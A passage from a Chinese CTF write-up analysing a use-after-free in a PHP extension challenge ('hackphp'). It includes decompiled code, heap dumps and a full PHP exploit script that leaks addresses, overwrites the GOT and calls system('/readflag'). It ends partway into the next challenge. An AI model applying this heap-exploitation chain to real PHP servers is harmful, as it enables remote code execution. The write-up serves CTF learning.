      __int64 v2; // rdi
      char *v3; // rdi
      __int64 size[3]; // [rsp+0h] [rbp-18h] BYREF
      v2 = execute_data->This.u2.next;
      size[1] = __readfsqword(0x28u);
      if ( (unsigned int)zend_parse_parameters(v2, &unk_2000, size) != -1 )
      {
        v3 = (char *)_emalloc(size[0]);
        buf = v3;
        buf_size = size[0];
        if ( v3 )
        {
          if ( (unsigned __int64)(size[0] - 0x100) u1.type_info = 3;
            return;
          }
          _efree(v3);
        }
      }
      return_value->u1.type_info = 2;
    }
当所给的size不处于0x100~0x200之间时，就会马上调用`_efree(v3)`给释放掉，但是指针并没有清空，依然可以show和edit。
  2. 其次，了解到本题中的堆管理机制并不同于ptmalloc，从利用的角度来说，而是有点类似于linux kernel的slab，即单考虑小块内存，总共有以下粒度，同一粒度的chunk最开始来自于某同一page： 
        define ZEND_MM_BINS_INFO(_, x, y) \
        _( 0,    8,  512, 1, x, y) \
        _( 1,   16,  256, 1, x, y) \
        _( 2,   24,  170, 1, x, y) \
        _( 3,   32,  128, 1, x, y) \
        _( 4,   40,  102, 1, x, y) \
        _( 5,   48,   85, 1, x, y) \
        _( 6,   56,   73, 1, x, y) \
        _( 7,   64,   64, 1, x, y) \
        _( 8,   80,   51, 1, x, y) \
        _( 9,   96,   42, 1, x, y) \
        _(10,  112,   36, 1, x, y) \
        _(11,  128,   32, 1, x, y) \
        _(12,  160,   25, 1, x, y) \
        _(13,  192,   21, 1, x, y) \
        _(14,  224,   18, 1, x, y) \
        _(15,  256,   16, 1, x, y) \
        _(16,  320,   64, 5, x, y) \
        _(17,  384,   32, 3, x, y) \
        _(18,  448,    9, 1, x, y) \
        _(19,  512,    8, 1, x, y) \
        _(20,  640,   32, 5, x, y) \
        _(21,  768,   16, 3, x, y) \
        _(22,  896,    9, 2, x, y) \
        _(23, 1024,    8, 2, x, y) \
        _(24, 1280,   16, 5, x, y) \
        _(25, 1536,    8, 3, x, y) \
        _(26, 1792,   16, 7, x, y) \
        _(27, 2048,    8, 4, x, y) \
        _(28, 2560,    8, 5, x, y) \
        _(29, 3072,    4, 3, x, y)
    #endif /* ZEND_ALLOC_SIZES_H */
申请内存空间时，大小向上对齐。
而空闲chunk的维护，也是通过一个单链表，即chunk中存在一个fd指针，指向下一个空闲chunk，当链表中最后一个chunk被申请出去时，其fd=0，则说明空闲chunk已被用完，之后再申请会从新的page中产生。
同样地在释放的时候，并不是任意内存均可被`_efree`，这里仅根据调试结果来看，应该需要位于特定的page中。
  3. 因此根据上面的管理机制，注意到对于size处于225~256时，申请出的chunk大小都是256，但是不同的是，只有size=256时，才能不触发`_efree`，否则会被立刻`_efree`。
  4. 同时在调试过程中发现，在申请第一个0x100的chunk时，存在残留的地址信息，其中有一项指向php进程的heap区域，而该区域正好存在hackphp.so中的函数地址，因此只要利用uaf，申请到该区域的内存，就能实现leak，得到hackphp.so的基址： 
        gef➤  tele 0x00007fa5c088e000
    0x00007fa5c088e000│+0x0000: "aaaaaaaabbbbbbbbccccccccdddddddd"
    0x00007fa5c088e008│+0x0008: "bbbbbbbbccccccccdddddddd"
    0x00007fa5c088e010│+0x0010: "ccccccccdddddddd"
    0x00007fa5c088e018│+0x0018: "dddddddd"
    0x00007fa5c088e020│+0x0020: 0x000055b970154f00  →  0x000001c600000001  ==> remained data
    0x00007fa5c088e028│+0x0028: 0x0000000000000006
    0x00007fa5c088e030│+0x0030: 0x00007fa5c0872200  →  0x0000004600000001
    0x00007fa5c088e038│+0x0038: 0x0000000000000006
    0x00007fa5c088e040│+0x0040: 0x000055b970155060  →  0x000001c600000001
    0x00007fa5c088e048│+0x0048: 0x0000000000000006
    gef➤  tele 0x000055b970154f00 50
    0x000055b970154f00│+0x0000: 0x000001c600000001
    0x000055b970154f08│+0x0008: 0xd304f972b2628589
    0x000055b970154f10│+0x0010: 0x000000000000000c
    0x000055b970154f18│+0x0018: "hackphp_edit"
    0x000055b970154f20│+0x0020: 0x0000000074696465 ("edit"?)
    0x000055b970154f28│+0x0028: 0x0000000000000081
    0x000055b970154f30│+0x0030: 0x0000000100000001
    0x000055b970154f38│+0x0038: 0x000055b970154f00  →  0x000001c600000001
    0x000055b970154f40│+0x0040: 0x0000000000000000
    0x000055b970154f48│+0x0048: 0x0000000000000000
    0x000055b970154f50│+0x0050: 0x0000000100000001
    0x000055b970154f58│+0x0058: 0x00007fa5c3073cb8  →  0x00007fa5c3072095  →  0x6c62757000727473 ("str"?)
    0x000055b970154f60│+0x0060: 0x00007fa5c3071480  →   endbr64   ==> hackphp.so
    0x000055b970154f68│+0x0068: 0x000055b970154da0  →  0x013416b6000000a8
    0x000055b970154f70│+0x0070: 0x0000000000000000
    0x000055b970154f78│+0x0078: 0x0000000000000000
    0x000055b970154f80│+0x0080: 0x0000000000000000
    0x000055b970154f88│+0x0088: 0x0000000000000000
    0x000055b970154f90│+0x0090: 0x0000000000000000
    0x000055b970154f98│+0x0098: 0x0000000000000000
    0x000055b970154fa0│+0x00a0: 0x0000000000000000
    0x000055b970154fa8│+0x00a8: 0x0000000000000031 ("1"?)
    0x000055b970154fb0│+0x00b0: 0x000001c600000001
    0x000055b970154fb8│+0x00b8: 0xa82920e8d2d87056
    0x000055b970154fc0│+0x00c0: 0x000000000000000e
    0x000055b970154fc8│+0x00c8: "hackphp_delete"
    0x000055b970154fd0│+0x00d0: 0x00006574656c6564 ("delete"?)
    0x000055b970154fd8│+0x00d8: 0x0000000000000081
    0x000055b970154fe0│+0x00e0: 0x0000000100000001
    0x000055b970154fe8│+0x00e8: 0x000055b970154fb0  →  0x000001c600000001
    0x000055b970154ff0│+0x00f0: 0x0000000000000000
    0x000055b970154ff8│+0x00f8: 0x0000000000000000
    0x000055b970155000│+0x0100: 0x0000000000000000
    0x000055b970155008│+0x0108: 0x0000000000000000
    0x000055b970155010│+0x0110: 0x00007fa5c3071420  →   endbr64      ==> hackphp.so
    0x000055b970155018│+0x0118: 0x000055b970154da0  →  0x013416b6000000a8
    0x000055b970155020│+0x0120: 0x0000000000000000
    0x000055b970155028│+0x0128: 0x0000000000000000
    0x000055b970155030│+0x0130: 0x0000000000000000
    0x000055b970155038│+0x0138: 0x0000000000000000
    0x000055b970155040│+0x0140: 0x0000000000000000
    0x000055b970155048│+0x0148: 0x0000000000000000
    0x000055b970155050│+0x0150: 0x0000000000000000
    0x000055b970155058│+0x0158: 0x0000000000000031 ("1"?)
    0x000055b970155060│+0x0160: 0x000001c600000001
    0x000055b970155068│+0x0168: 0xc0938b7014ebbf23
    0x000055b970155070│+0x0170: 0x000000000000000b
    0x000055b970155078│+0x0178: "hackphp_get"
    0x000055b970155080│+0x0180: 0x0000000000746567 ("get"?)
    0x000055b970155088│+0x0188: 0x0000000000000081
这里发现调试的时候，残留的heap地址不是固定的，可能重启下就又换了个地址，但是并不影响后续利用，如果出现如上的情况只要`hackphp_edit`的时候多写一个字节，然后算地址的时候处理一下即可。
  5. 得到hackphp.so的基址，加上任意地址写，就能够完全控制全局变量`buf`；不过这里要注意一下，`_emalloc`到任意地址的时候，要注意该地址的fake chunk->fd要么指向可写地址，原因是打印的时候也会触发`_emalloc`；要么直接为0，这样下一次`_emalloc`就会重新分配新的page，不会破坏内存。
  6. 因此利用的思路为： 
    * 首先正常`_emalloc(0x100)`，leak出php进程的heap地址。
    * 之后通过uaf，申请到该heap中的内存，通过`zif_hackphp_get`得到hackphp.so的加载基址。
    * 继续通过uaf，申请到全局变量buf所在的内存空间，覆盖buf指向`memcpy_got`。
    * 通过`zif_hackphp_get`得到`memcpy`的地址，计算出libc基址和`system`的地址。
    * 再通过`zif_hackphp_edit`覆盖`memcpy_got`处为`/readflag`，以及覆盖`_efree`为`system`。
    * 最后调用`zif_hackphp_delete`触发`system`。
  7. exp： 
        = 0;$i--) $hex.= dechex(ord($str[$i]));
        $hex = strtoupper($hex);
        return $hex;
    }
    function hexToStr($hex) {
            $hex = sprintf("%08x", $hex);
            $str = "";
            for ($i = strlen($hex) - 2;$i >= 0;$i -= 2) $str.= chr(hexdec($hex[$i] . $hex[$i + 1]));
            return $str;
    }
    function read() {
        $fp = fopen('/dev/stdin', 'r');
        $input = fgets($fp, 255);
        fclose($fp);
        $input = chop($input);
        return $input;
    }
    hackphp_create(0x100);
    echo read();
    hackphp_edit("aaaaaaaabbbbbbbbccccccccdddddddd");
    $a = hackphp_get();
    echo $a."\n";
    echo strlen($a);
    $heap_addr = substr($a, -6);
    echo $heap_addr."\n";
    $heap_addrn = base_convert(strTohex($heap_addr),16,10);
    echo $heap_addrn;
    echo "\n";
    hackphp_create(0xff);
    hackphp_edit(hexToStr($heap_addrn + 0xf8));
    hackphp_create(0x100);
    hackphp_create(0x100);
    hackphp_edit("aaaaaaaabbbbbbbbcccccccc");
    $edit_addr = substr(hackphp_get(), -6);
    $edit_addrn = base_convert(strTohex($edit_addr),16,10);
    $buf_addrn = $edit_addrn - 0x1420 + 0x4178;
    echo $buf_addrn;
    echo "\n";
    $buf_addr = hexToStr($buf_addrn-0x10);
    $vline = $heap_addrn + 0xC8090;
    $memcpy_got = $edit_addrn-0x1420+0x4060;
    hackphp_create(0xff);
    hackphp_edit($buf_addr);
    hackphp_create(0x100);
    hackphp_create(0x100);
    $payload = "\x00\x00\x00\x00\x00\x00\x00\x00".hexToStr($vline)."\x00\x00".hexToStr($memcpy_got);
    hackphp_edit($payload);
    $libc = hackphp_get();
    $libcn = base_convert(strToHex($libc),16,10) - 0x18e670;
    $system_addr = $libcn + 0x55410; 
    echo $libcn;
    $pay = "/readflag\x00\x00\x00\x00\x00\x00\x00".chr($system_addr & 0xFF).chr(($system_addr >> 8) & 0xFF).chr(($system_addr >> 16) & 0xFF).chr(($system_addr >> 24) & 0xFF).chr(($system_addr >> 32) & 0xFF).chr(($system_addr >> 40) & 0xFF);
    hackphp_edit($pay);
    hackphp_delete();
    // echo read();
    ?>
  8. 附上调试过程中踩到的坑： 
    * 在调用`zif_hackphp_get`的时候，要保证此时内存状态是正常的，因为： 
                void __fastcall zif_hackphp_get(zend_execute_data *execute_data, zval *return_value)
        {
          __int64 v2; // rax
          if ( buf && buf_size )
          {
            v2 = zend_strpprintf(0LL, "%s", buf);
            return_value->value.lval = v2;
            return_value->u1.type_info = (*(_DWORD *)(v2 + 4) & 0x40) == 0 ? 262 : 6;
          }
          else
          {
            return_value->u1.type_info = 2;
          }
        }
其中`zend_strpprintf`会调用到`_emalloc`申请临时buffer，之后用完会释放，若此时内存状态不正常，就会crash。
    * 调试的时候可以手动实现一个`read`的功能，将php断住，便于下断点。至于`fopen`被禁用的问题，可以修改`php.ini`中的`disable_function`，把`fopen`给删掉即可。
## 狡兔三窟
  1. 首先分析一下几个重要的结构体，以及各个菜单的功能： 
    * NoteStorageImpl： 
                struct NoteStorageImpl
        {
            struct NoteImpl *member_1; // offset = 0
            struct NoteImpl *member_2; // offset = 8
            struct NoteDBImpl *house;  // offset = 0x10
        };
    * NoteImpl: 
                struct NoteImpl
        {
            void *func_get_encourage; // offset = 0
            uint8_t vector_status;       // offset = 8
            vector buf_1;       // offset = 0x10
            vector buf_2;          // offset = 0x1A0
            void *malloc;              // offset = 0x1B8    
        }
    * NoteDBImpl 
                struct NoteDBImpl
        {
            struct NoteImpl *member; // offset = 0
            uint8_t status;           // offset = 8
        }
    * editHouse： 
                __int64 __fastcall NoteStorageImpl::editHouse(NoteStorageImpl *this)
        {